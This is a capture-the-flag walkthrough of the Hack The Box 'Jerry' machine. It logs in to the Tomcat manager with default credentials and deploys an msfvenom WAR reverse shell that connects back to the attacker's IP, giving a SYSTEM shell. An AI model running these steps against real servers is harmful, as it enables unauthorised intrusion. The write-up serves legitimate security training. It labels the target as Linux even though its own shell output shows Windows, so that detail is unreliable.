# Jerry - Linux, easy (10.10.10.95)

### Enumeration
```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
```

Gobuster:
```
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/] 
```

In /manager, after failing the authentication, we can see the following line `For example, to add the manager-gui role to a user named tomcat with a password of s3cret, add the following to the config file listed above.`.
So this may suggest that the credentials are tomcat:s3cret, and we can use them to successfully log in!

After login, in the manager page there's a 'WAR file to deploy' field, where we can upload a .war file and deploy it.
We can try to create a reverse shell with msfvenom `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f war -o rev-shell.war`.
After uploading it and setting up a netcat listener we just need to click on it and the magic will happen:
```
C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

Now just nagivate to `C:\Users\Administrator\Desktop\flags` and type `type "2 for the price of 1.txt" to get both user and root flags!
